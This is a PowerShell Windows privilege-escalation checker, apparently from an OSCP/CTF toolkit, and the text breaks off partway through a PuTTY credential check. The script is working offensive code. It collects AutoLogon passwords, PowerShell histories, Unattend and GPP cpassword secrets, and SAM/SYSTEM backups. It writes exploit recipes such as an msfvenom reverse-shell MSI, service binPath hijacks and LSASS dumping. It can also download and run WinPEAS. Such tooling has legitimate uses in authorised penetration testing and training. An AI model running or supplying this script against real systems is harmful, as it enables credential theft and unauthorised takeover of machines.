<![CDATA[###########################################
# Windows Privilege Escalation Checker
# Based on OSCP/CTF methodology
###########################################

param(
    [switch]$Quick,
    [switch]$Full,
    [string]$Output = "",
    [switch]$WinPEAS,
    [switch]$Help
)

# Colors
function Write-Color {
    param(
        [string]$Text,
        [string]$Color = "White"
    )
    Write-Host $Text -ForegroundColor $Color
}

function Write-QuickWin {
    param([string]$Text)
    Write-Color "[!!! QUICK WIN !!!] $Text" "Red"
}

function Write-Interesting {
    param([string]$Text)
    Write-Color "[+] INTERESTING: $Text" "Yellow"
}

function Write-Info {
    param([string]$Text)
    Write-Color "[*] $Text" "Cyan"
}

function Write-Success {
    param([string]$Text)
    Write-Color "[+] $Text" "Green"
}

# Banner
function Show-Banner {
    Write-Color @"

╔═══════════════════════════════════════════════════════════╗
║   ____       _       _____            _____ _               ║
║  |  _ \ _ __(_)_   _| ____|___  ___  / ____| |__   ___  ___║
║  | |_) | '__| \ \ / /  _| / __|/ __|| |    | '_ \ / _ \/ __|
║  |  __/| |  | |\ V /| |___\__ \ (__ | |____| | | |  __/ (__ ║
║  |_|   |_|  |_| \_/ |_____|___/\___| \_____|_| |_|\___|\___|
║                                                             ║
║           Windows Privilege Escalation Checker             ║
╚═══════════════════════════════════════════════════════════╝

"@ "Magenta"
}

# Help
function Show-Help {
    Write-Host @"
Usage: .\privesc_windows.ps1 [OPTIONS]

OPTIONS:
    -Quick          Quick wins only (AlwaysInstallElevated, unquoted paths, etc.)
    -Full           Full enumeration (recommended)
    -Output <dir>   Output directory (default: .\privesc_results_*)
    -WinPEAS        Download and run WinPEAS
    -Help           Show this help message

MODES:
    Quick Mode:     Fast scan for common quick wins
    Full Mode:      Comprehensive enumeration (default)

EXAMPLES:
    .\privesc_windows.ps1 -Quick                    # Quick wins only
    .\privesc_windows.ps1 -Full                     # Full enumeration
    .\privesc_windows.ps1 -Full -WinPEAS            # Full enumeration + WinPEAS
    .\privesc_windows.ps1 -Quick -Output C:\Temp    # Quick scan with custom output

"@
    exit 0
}

if ($Help) {
    Show-Banner
    Show-Help
}

# Setup output directory
if ($Output -eq "") {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Output = ".\privesc_results_$timestamp"
}

if (!(Test-Path $Output)) {
    New-Item -ItemType Directory -Path $Output | Out-Null
}

$QuickWinsFile = Join-Path $Output "QUICK_WINS.txt"
$InterestingFile = Join-Path $Output "interesting_finds.txt"

Show-Banner
Write-Info "Output directory: $Output"
Write-Host ""

###########################################
# QUICK WINS CHECKS
###########################################

function Check-AlwaysInstallElevated {
    Write-Info "Checking AlwaysInstallElevated registry keys..."

    $hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    $hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
        $finding = "AlwaysInstallElevated is enabled! Can install MSI as SYSTEM."
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        Add-Content -Path $QuickWinsFile -Value "Exploit: Create malicious MSI with msfvenom"
        Add-Content -Path $QuickWinsFile -Value "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi"
        Add-Content -Path $QuickWinsFile -Value "  msiexec /quiet /qn /i C:\Temp\evil.msi`n"
        return $true
    }
    return $false
}

function Check-UnquotedServicePaths {
    Write-Info "Checking for unquoted service paths..."

    $unquoted = @()
    $services = Get-WmiObject -Class Win32_Service | Where-Object {
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' ' -and
        $_.PathName -notmatch 'C:\\Windows\\'
    }

    foreach ($service in $services) {
        $path = $service.PathName -replace '(.*\.exe).*', '$1'

        # Check if we can write to any part of the path
        $pathParts = $path.Split('\')
        for ($i = 1; $i -lt $pathParts.Length - 1; $i++) {
            $testPath = ($pathParts[0..$i] -join '\')

            try {
                $acl = Get-Acl $testPath -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $writable = $false

                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -eq $currentUser.Name -or
                        $access.IdentityReference -eq "BUILTIN\Users" -or
                        $access.IdentityReference -eq "Everyone") {
                        if ($access.FileSystemRights -match "Write|FullControl|Modify") {
                            $writable = $true
                            break
                        }
                    }
                }

                if ($writable) {
                    $finding = "Unquoted service path: $($service.Name) - $($service.PathName)"
                    Write-QuickWin $finding
                    Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                    Add-Content -Path $QuickWinsFile -Value "  Writable path: $testPath"
                    Add-Content -Path $QuickWinsFile -Value "  StartMode: $($service.StartMode)"
                    Add-Content -Path $QuickWinsFile -Value "  State: $($service.State)`n"
                    $unquoted += $service
                    break
                }
            }
            catch {
                continue
            }
        }
    }

    if ($unquoted.Count -eq 0) {
        Write-Host "  No exploitable unquoted service paths found"
    }

    return $unquoted.Count -gt 0
}

function Check-WritableServiceBinaries {
    Write-Info "Checking for writable service binaries..."

    $writable = @()
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -match '\.exe' }

    foreach ($service in $services) {
        $path = $service.PathName -replace '"', '' -replace '(.*\.exe).*', '$1'

        if (Test-Path $path) {
            try {
                $acl = Get-Acl $path -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -eq $currentUser.Name -or
                        $access.IdentityReference -eq "BUILTIN\Users" -or
                        $access.IdentityReference -eq "Everyone") {
                        if ($access.FileSystemRights -match "Write|FullControl|Modify") {
                            $finding = "Writable service binary: $($service.Name) - $path"
                            Write-QuickWin $finding
                            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                            Add-Content -Path $QuickWinsFile -Value "  StartMode: $($service.StartMode)"
                            Add-Content -Path $QuickWinsFile -Value "  State: $($service.State)"
                            Add-Content -Path $QuickWinsFile -Value "  Replace with malicious binary`n"
                            $writable += $service
                            break
                        }
                    }
                }
            }
            catch {
                continue
            }
        }
    }

    if ($writable.Count -eq 0) {
        Write-Host "  No writable service binaries found"
    }

    return $writable.Count -gt 0
}

function Check-ModifiableServices {
    Write-Info "Checking for modifiable service configurations..."

    $modifiable = @()

    try {
        $services = Get-Service | ForEach-Object {
            $serviceName = $_.Name
            $serviceRights = $null

            try {
                $sd = sc.exe sdshow $serviceName 2>$null
                if ($sd -match "Everyone" -or $sd -match "BUILTIN\\Users") {
                    $modifiable += $serviceName
                    $finding = "Modifiable service: $serviceName"
                    Write-QuickWin $finding
                    Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                    Add-Content -Path $QuickWinsFile -Value "  Can modify service configuration"
                    Add-Content -Path $QuickWinsFile -Value "  Change binPath: sc config $serviceName binPath= 'C:\path\to\malicious.exe'`n"
                }
            }
            catch {
                continue
            }
        }
    }
    catch {
        Write-Host "  Error checking service permissions"
    }

    if ($modifiable.Count -eq 0) {
        Write-Host "  No modifiable services found"
    }

    return $modifiable.Count -gt 0
}

function Check-AutoLogonCredentials {
    Write-Info "Checking for AutoLogon credentials..."

    $found = $false

    $username = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue
    $password = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue

    if ($username -and $password) {
        $finding = "AutoLogon credentials found!"
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        Add-Content -Path $QuickWinsFile -Value "  Username: $($username.DefaultUserName)"
        Add-Content -Path $QuickWinsFile -Value "  Password: $($password.DefaultPassword)`n"
        $found = $true
    }

    if (!$found) {
        Write-Host "  No AutoLogon credentials found"
    }

    return $found
}

function Check-ScheduledTasksWritable {
    Write-Info "Checking for writable scheduled task binaries..."

    $writable = @()

    try {
        $tasks = Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" }

        foreach ($task in $tasks) {
            $actions = $task.Actions
            foreach ($action in $actions) {
                if ($action.Execute) {
                    $exe = $action.Execute -replace '"', ''

                    if (Test-Path $exe) {
                        try {
                            $acl = Get-Acl $exe -ErrorAction Stop
                            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

                            foreach ($access in $acl.Access) {
                                if ($access.IdentityReference -match "Users|Everyone" -or
                                    $access.IdentityReference -eq $currentUser.Name) {
                                    if ($access.FileSystemRights -match "Write|FullControl|Modify") {
                                        $finding = "Writable scheduled task binary: $($task.TaskName) - $exe"
                                        Write-QuickWin $finding
                                        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                                        Add-Content -Path $QuickWinsFile -Value "  Task: $($task.TaskPath)$($task.TaskName)"
                                        Add-Content -Path $QuickWinsFile -Value "  State: $($task.State)`n"
                                        $writable += $task
                                        break
                                    }
                                }
                            }
                        }
                        catch {
                            continue
                        }
                    }
                }
            }
        }
    }
    catch {
        Write-Host "  Error checking scheduled tasks"
    }

    if ($writable.Count -eq 0) {
        Write-Host "  No writable scheduled task binaries found"
    }

    return $writable.Count -gt 0
}

function Check-TokenPrivileges {
    Write-Info "Checking current user privileges..."

    $dangerous = @("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
                   "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
                   "SeLoadDriverPrivilege", "SeTcbPrivilege")

    $found = $false
    whoami /priv | Out-File -FilePath (Join-Path $Output "privileges.txt")

    foreach ($priv in $dangerous) {
        $hasPriv = whoami /priv | Select-String $priv | Select-String "Enabled"

        if ($hasPriv) {
            $finding = "Dangerous privilege enabled: $priv"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            switch ($priv) {
                "SeImpersonatePrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: PrintSpoofer, RoguePotato, JuicyPotato"
                }
                "SeAssignPrimaryTokenPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Same as SeImpersonatePrivilege"
                }
                "SeDebugPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Process injection, dump LSASS"
                }
                "SeBackupPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Read any file, dump SAM/SYSTEM"
                }
                "SeRestorePrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Write to any file, modify registry"
                }
                "SeTakeOwnershipPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Take ownership of any file"
                }
            }
            Add-Content -Path $QuickWinsFile -Value ""
            $found = $true
        }
    }

    if (!$found) {
        Write-Host "  No dangerous privileges found"
    }

    return $found
}

###########################################
# FULL ENUMERATION
###########################################

function Get-SystemInfo {
    Write-Info "Gathering system information..."

    $sysinfo = @"
=== SYSTEM INFORMATION ===

Computer Name: $env:COMPUTERNAME
OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Version: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Version)
Architecture: $env:PROCESSOR_ARCHITECTURE
Current User: $env:USERNAME
Domain: $env:USERDOMAIN
Hostname: $env:COMPUTERNAME

"@

    Add-Content -Path (Join-Path $Output "systeminfo.txt") -Value $sysinfo

    systeminfo | Out-File -FilePath (Join-Path $Output "systeminfo_full.txt")
}

function Get-UserInfo {
    Write-Info "Gathering user information..."

    whoami /all | Out-File -FilePath (Join-Path $Output "whoami.txt")

    net user | Out-File -FilePath (Join-Path $Output "users.txt")
    net localgroup administrators | Out-File -FilePath (Join-Path $Output "administrators.txt")

    # Check for other users
    Get-LocalUser | Out-File -FilePath (Join-Path $Output "localusers.txt")
}

function Get-NetworkInfo {
    Write-Info "Gathering network information..."

    ipconfig /all | Out-File -FilePath (Join-Path $Output "ipconfig.txt")
    route print | Out-File -FilePath (Join-Path $Output "routes.txt")
    netstat -ano | Out-File -FilePath (Join-Path $Output "netstat.txt")

    # ARP cache
    arp -a | Out-File -FilePath (Join-Path $Output "arp.txt")
}

function Get-InstalledSoftware {
    Write-Info "Enumerating installed software..."

    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
        Out-File -FilePath (Join-Path $Output "installed_software.txt")

    # 32-bit software on 64-bit system
    if (Test-Path "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall") {
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
            Out-File -Append -FilePath (Join-Path $Output "installed_software.txt")
    }
}

function Check-Passwords {
    Write-Info "Searching for passwords in common locations..."

    $interesting = @()

    # Registry
    $regPaths = @(
        "HKCU:\Software\",
        "HKLM:\Software\"
    )

    # Search for password-related registry keys
    Write-Host "  Searching registry for passwords..."
    reg query HKLM /f password /t REG_SZ /s 2>$null | Out-File -FilePath (Join-Path $Output "registry_passwords.txt")
    reg query HKCU /f password /t REG_SZ /s 2>$null | Out-File -Append -FilePath (Join-Path $Output "registry_passwords.txt")

    # Common file locations
    $searchPaths = @(
        "$env:USERPROFILE\",
        "C:\inetpub\wwwroot\",
        "C:\xampp\",
        "C:\wamp\"
    )

    Write-Host "  Searching files for passwords..."
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Recurse -Include *.txt,*.xml,*.ini,*.config,*.conf -ErrorAction SilentlyContinue |
                Select-String -Pattern "password" -ErrorAction SilentlyContinue |
                Out-File -Append -FilePath (Join-Path $Output "file_passwords.txt")
        }
    }

    # PowerShell history
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Write-Interesting "PowerShell history file found"
        Copy-Item $historyPath (Join-Path $Output "powershell_history.txt")

        $passwordLines = Get-Content $historyPath | Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
        if ($passwordLines) {
            Add-Content -Path $InterestingFile -Value "`n[+] Passwords found in PowerShell history:"
            Add-Content -Path $InterestingFile -Value $passwordLines
        }
    }
}

function Check-InterestingFiles {
    Write-Info "Searching for interesting files..."

    $extensions = @("*.kdbx", "*.vmdk", "*.vhd", "*.config", "*.conf", "*.ini", "*.xml", "*.bat", "*.cmd", "*.vbs", "*.ps1")

    Get-ChildItem -Path C:\ -Recurse -Include $extensions -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, LastWriteTime |
        Out-File -FilePath (Join-Path $Output "interesting_files.txt")

    # SAM/SYSTEM backups
    $backupPaths = @(
        "C:\Windows\repair\SAM",
        "C:\Windows\System32\config\RegBack\SAM",
        "C:\Windows\repair\SYSTEM",
        "C:\Windows\System32\config\RegBack\SYSTEM"
    )

    foreach ($path in $backupPaths) {
        if (Test-Path $path) {
            Write-QuickWin "SAM/SYSTEM backup found: $path"
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] SAM/SYSTEM backup: $path`n"
        }
    }
}

function Check-StartupPrograms {
    Write-Info "Checking startup programs..."

    # Startup folder
    Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue |
        Out-File -FilePath (Join-Path $Output "startup_programs.txt")

    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue |
        Out-File -Append -FilePath (Join-Path $Output "startup_programs.txt")

    # Registry Run keys
    Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue |
        Out-File -Append -FilePath (Join-Path $Output "startup_programs.txt")

    Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue |
        Out-File -Append -FilePath (Join-Path $Output "startup_programs.txt")
}

function Check-FirewallRules {
    Write-Info "Checking firewall configuration..."

    netsh advfirewall show allprofiles | Out-File -FilePath (Join-Path $Output "firewall.txt")
    netsh advfirewall firewall show rule name=all | Out-File -Append -FilePath (Join-Path $Output "firewall.txt")
}

function Check-DLLHijacking {
    Write-Info "Checking for potential DLL hijacking opportunities..."

    # Check PATH for writable directories
    $pathDirs = $env:PATH -split ';'
    $writable = @()

    foreach ($dir in $pathDirs) {
        if (Test-Path $dir) {
            try {
                $testFile = Join-Path $dir "test_write_$(Get-Random).tmp"
                [System.IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                $writable += $dir
                Write-Interesting "Writable directory in PATH: $dir"
                Add-Content -Path $InterestingFile -Value "[+] Writable PATH directory: $dir"
            }
            catch {
                continue
            }
        }
    }

    if ($writable.Count -gt 0) {
        Add-Content -Path $QuickWinsFile -Value "[POTENTIAL] DLL Hijacking via writable PATH directories`n"
    }
}

function Download-WinPEAS {
    Write-Info "Downloading WinPEAS..."

    $winpeasUrl = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
    $winpeasPath = Join-Path $Output "winPEAS.exe"

    try {
        Invoke-WebRequest -Uri $winpeasUrl -OutFile $winpeasPath -UseBasicParsing
        Write-Success "WinPEAS downloaded to: $winpeasPath"

        Write-Info "Running WinPEAS..."
        $winpeasOutput = Join-Path $Output "winpeas_output.txt"
        & $winpeasPath > $winpeasOutput 2>&1
        Write-Success "WinPEAS output saved to: $winpeasOutput"
    }
    catch {
        Write-Host "  Error downloading WinPEAS: $_" -ForegroundColor Red
    }
}

###########################################
# EXTENDED CHECKS
###########################################

function Check-SavedCredentials {
    Write-Info "Checking for saved credentials (cmdkey)..."

    $cmdkeyOutput = cmdkey /list 2>$null
    $entries = $cmdkeyOutput | Select-String "Target:"

    if ($entries) {
        $finding = "Saved credentials found via cmdkey ($($entries.Count) entries)"
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        foreach ($entry in $entries) {
            $line = $entry.Line.Trim()
            Write-Host "    $line" -ForegroundColor Yellow
            Add-Content -Path $QuickWinsFile -Value "  $line"
        }
        Add-Content -Path $QuickWinsFile -Value "  Exploit: runas /savecred /user:<TARGET> cmd.exe`n"
        return $true
    }

    Write-Host "  No saved credentials found"
    return $false
}

function Check-PowerShellHistory {
    Write-Info "Checking PowerShell history for all users..."

    $found = $false
    $profilesDir = "C:\Users"

    if (Test-Path $profilesDir) {
        $profiles = Get-ChildItem $profilesDir -Directory -ErrorAction SilentlyContinue

        foreach ($profile in $profiles) {
            $histPath = Join-Path $profile.FullName "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

            if (Test-Path $histPath) {
                try {
                    $content = Get-Content $histPath -ErrorAction Stop
                    if ($content) {
                        $finding = "PowerShell history found for $($profile.Name): $histPath"
                        Write-QuickWin $finding
                        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

                        $sensitiveLines = $content | Select-String -Pattern "password|pwd|pass|credential|secret|key|token|ConvertTo-SecureString" -ErrorAction SilentlyContinue
                        if ($sensitiveLines) {
                            Add-Content -Path $QuickWinsFile -Value "  Sensitive content found:"
                            foreach ($line in $sensitiveLines) {
                                Add-Content -Path $QuickWinsFile -Value "    $($line.Line.Trim())"
                            }
                        }

                        Copy-Item $histPath (Join-Path $Output "ps_history_$($profile.Name).txt") -ErrorAction SilentlyContinue
                        Add-Content -Path $QuickWinsFile -Value ""
                        $found = $true
                    }
                }
                catch {
                    continue
                }
            }
        }
    }

    if (!$found) {
        Write-Host "  No accessible PowerShell history found"
    }

    return $found
}

function Check-WeakServiceRegistryACLs {
    Write-Info "Checking for weak service registry ACLs..."

    $found = $false
    $servicesKey = "HKLM:\SYSTEM\CurrentControlSet\Services"

    try {
        $serviceKeys = Get-ChildItem $servicesKey -ErrorAction Stop | Select-Object -First 200

        foreach ($key in $serviceKeys) {
            try {
                $acl = Get-Acl $key.PSPath -ErrorAction Stop

                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -match "BUILTIN\\Users|Everyone|Authenticated Users") {
                        if ($access.RegistryRights -match "FullControl|SetValue|WriteKey") {
                            $finding = "Weak registry ACL on service: $($key.PSChildName) - $($access.IdentityReference) has $($access.RegistryRights)"
                            Write-Interesting $finding
                            Add-Content -Path $InterestingFile -Value "[+] $finding"
                            Add-Content -Path $InterestingFile -Value "  Registry key: $($key.PSPath)"
                            Add-Content -Path $InterestingFile -Value "  Exploit: Modify ImagePath to point to malicious binary`n"
                            $found = $true
                            break
                        }
                    }
                }
            }
            catch {
                continue
            }
        }
    }
    catch {
        Write-Host "  Error accessing service registry keys"
    }

    if (!$found) {
        Write-Host "  No weak service registry ACLs found"
    }

    return $found
}

function Check-UnattendFiles {
    Write-Info "Checking for Unattend/Sysprep XML files..."

    $found = $false
    $paths = @(
        "C:\unattend.xml",
        "C:\Windows\Panther\unattend.xml",
        "C:\Windows\Panther\Unattend\unattend.xml",
        "C:\Windows\Panther\unattended.xml",
        "C:\Windows\Panther\unattend\unattended.xml",
        "C:\Windows\System32\Sysprep\unattend.xml",
        "C:\Windows\System32\Sysprep\sysprep.xml",
        "C:\Windows\System32\Sysprep\Panther\unattend.xml",
        "C:\Windows\SysWOW64\Sysprep\unattend.xml",
        "C:\Windows\Panther\setupinfo",
        "C:\Windows\Panther\setupinfo.log"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            $finding = "Unattend/Sysprep file found: $path"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            try {
                $content = Get-Content $path -Raw -ErrorAction Stop
                $passwordMatches = [regex]::Matches($content, '(?s)<Password>.*?</Password>|(?s)<AdministratorPassword>.*?</AdministratorPassword>|(?s)<AutoLogon>.*?</AutoLogon>')
                foreach ($match in $passwordMatches) {
                    Add-Content -Path $QuickWinsFile -Value "  Password block found: $($match.Value.Substring(0, [Math]::Min(200, $match.Value.Length)))"
                }
            }
            catch {
                Add-Content -Path $QuickWinsFile -Value "  File exists but could not read contents"
            }

            Copy-Item $path (Join-Path $Output "unattend_$(Split-Path $path -Leaf)") -ErrorAction SilentlyContinue
            Add-Content -Path $QuickWinsFile -Value ""
            $found = $true
        }
    }

    if (!$found) {
        Write-Host "  No Unattend/Sysprep files found"
    }

    return $found
}

function Check-PrivilegedGroupMembership {
    Write-Info "Checking privileged group membership..."

    $found = $false
    $currentUser = $env:USERNAME
    $privilegedGroups = @(
        "Backup Operators",
        "Server Operators",
        "DnsAdmins",
        "Print Operators",
        "Account Operators",
        "Remote Desktop Users",
        "Remote Management Users",
        "Hyper-V Administrators"
    )

    $userGroups = whoami /groups 2>$null

    foreach ($group in $privilegedGroups) {
        if ($userGroups | Select-String $group) {
            $finding = "User '$currentUser' is a member of privileged group: $group"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            switch ($group) {
                "Backup Operators"   { Add-Content -Path $QuickWinsFile -Value "  Exploit: Can backup SAM/SYSTEM, read any file via SeBackupPrivilege" }
                "Server Operators"   { Add-Content -Path $QuickWinsFile -Value "  Exploit: Can start/stop services, load drivers" }
                "DnsAdmins"          { Add-Content -Path $QuickWinsFile -Value "  Exploit: DLL injection via dnscmd /config /serverlevelplugindll" }
                "Print Operators"    { Add-Content -Path $QuickWinsFile -Value "  Exploit: Can load drivers, modify printer configs" }
                "Account Operators"  { Add-Content -Path $QuickWinsFile -Value "  Exploit: Can create/modify accounts, add to groups" }
            }
            Add-Content -Path $QuickWinsFile -Value ""
            $found = $true
        }
    }

    if (!$found) {
        Write-Host "  User is not in any targeted privileged groups"
    }

    return $found
}

function Check-GPPPasswords {
    Write-Info "Checking for GPP cpassword in SYSVOL..."

    $found = $false
    $domain = $env:USERDNSDOMAIN

    if (!$domain) {
        Write-Host "  Not domain-joined, skipping GPP check"
        return $false
    }

    $sysvolPath = "\\$domain\SYSVOL\$domain\Policies"
    $gppFiles = @("Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml")

    try {
        if (Test-Path $sysvolPath) {
            foreach ($fileName in $gppFiles) {
                $files = Get-ChildItem -Path $sysvolPath -Recurse -Include $fileName -ErrorAction SilentlyContinue

                foreach ($file in $files) {
                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content -match "cpassword") {
                        $finding = "GPP password found in $($file.FullName)"
                        Write-QuickWin $finding
                        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                        Add-Content -Path $QuickWinsFile -Value "  Decrypt: gpp-decrypt <cpassword_value>"
                        Add-Content -Path $QuickWinsFile -Value "  Tool: Get-GPPPassword (PowerSploit)`n"

                        $cpassMatches = [regex]::Matches($content, 'cpassword="([^"]+)"')
                        foreach ($match in $cpassMatches) {
                            Add-Content -Path $QuickWinsFile -Value "  cpassword: $($match.Groups[1].Value)"
                        }
                        Add-Content -Path $QuickWinsFile -Value ""
                        Copy-Item $file.FullName (Join-Path $Output "gpp_$($file.Name)") -ErrorAction SilentlyContinue
                        $found = $true
                    }
                }
            }
        }
        else {
            Write-Host "  Cannot access SYSVOL at $sysvolPath"
        }
    }
    catch {
        Write-Host "  Error accessing SYSVOL: $_"
    }

    if (!$found) {
        Write-Host "  No GPP passwords found"
    }

    return $found
}

function Check-UACLevel {
    Write-Info "Checking UAC configuration..."

    $enableLUA = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -ErrorAction SilentlyContinue).EnableLUA
    $consentAdmin = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
    $localFilter = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -ErrorAction SilentlyContinue).LocalAccountTokenFilterPolicy

    $interesting = $false

    Write-Host "  EnableLUA: $enableLUA"
    Write-Host "  ConsentPromptBehaviorAdmin: $consentAdmin"
    Write-Host "  LocalAccountTokenFilterPolicy: $localFilter"

    if ($enableLUA -eq 0) {
        $finding = "UAC is DISABLED (EnableLUA = 0)"
        Write-Interesting $finding
        Add-Content -Path $InterestingFile -Value "[+] $finding`n"
        $interesting = $true
    }

    if ($consentAdmin -eq 0) {
        $finding = "UAC admin consent prompt is DISABLED (auto-elevate without prompt)"
        Write-Interesting $finding
        Add-Content -Path $InterestingFile -Value "[+] $finding"
        Add-Content -Path $InterestingFile -Value "  Exploit: UAC bypass techniques will auto-elevate`n"
        $interesting = $true
    }

    if ($localFilter -eq 1) {
        $finding = "LocalAccountTokenFilterPolicy is 1 — remote local admin access allowed (pass-the-hash)"
        Write-Interesting $finding
        Add-Content -Path $InterestingFile -Value "[+] $finding`n"
        $interesting = $true
    }

    if (!$interesting) {
        Write-Host "  UAC configuration is default"
    }

    return $interesting
}

function Check-SAMSystemBackups {
    Write-Info "Checking for SAM/SYSTEM backup files..."

    $found = $false
    $paths = @(
        "C:\Windows\repair\SAM",
        "C:\Windows\repair\SYSTEM",
        "C:\Windows\repair\SECURITY",
        "C:\Windows\System32\config\RegBack\SAM",
        "C:\Windows\System32\config\RegBack\SYSTEM",
        "C:\Windows\System32\config\RegBack\SECURITY",
        "C:\Windows\System32\config\SAM.bak",
        "C:\Windows\System32\config\SYSTEM.bak"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $size = (Get-Item $path -ErrorAction Stop).Length
                if ($size -gt 0) {
                    $finding = "SAM/SYSTEM backup found: $path ($size bytes)"
                    Write-QuickWin $finding
                    Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                    Add-Content -Path $QuickWinsFile -Value "  Copy and extract hashes: secretsdump.py -sam SAM -system SYSTEM LOCAL`n"
                    $found = $true
                }
            }
            catch {
                continue
            }
        }
    }

    # Check shadow copies
    try {
        $shadows = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue
        if ($shadows) {
            foreach ($shadow in $shadows) {
                $shadowPath = $shadow.DeviceObject
                Write-Interesting "Shadow copy found: $shadowPath"
                Add-Content -Path $InterestingFile -Value "[+] Shadow copy: $shadowPath"
                Add-Content -Path $InterestingFile -Value "  Exploit: mklink /d C:\shadowcopy $shadowPath\"
                Add-Content -Path $InterestingFile -Value "  Then copy SAM/SYSTEM from C:\shadowcopy\Windows\System32\config\`n"
                $found = $true
            }
        }
    }
    catch {
        Write-Host "  Could not enumerate shadow copies"
    }

    if (!$found) {
        Write-Host "  No accessible SAM/SYSTEM backups found"
    }

    return $found
}

function Check-StoredCredentialFiles {
    Write-Info "Checking PuTTY/WinSCP/FileZilla stored credentials..."

    $found = $false

    # PuTTY sessions and SSH keys
    $puttyKeys = Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" -ErrorAction SilentlyContinue
    if ($puttyKeys) {
        foreach ($session in $puttyKeys) {
            $finding = "PuTTY session found: $($session.PSChildName)"
            Write-Interesting $finding
            Add-Content -Path $InterestingFile -Value "[+] $finding"

            if ($session.HostName) { Add-Content -Path $InterestingFile -Value "  Host: $($session.HostName)" }
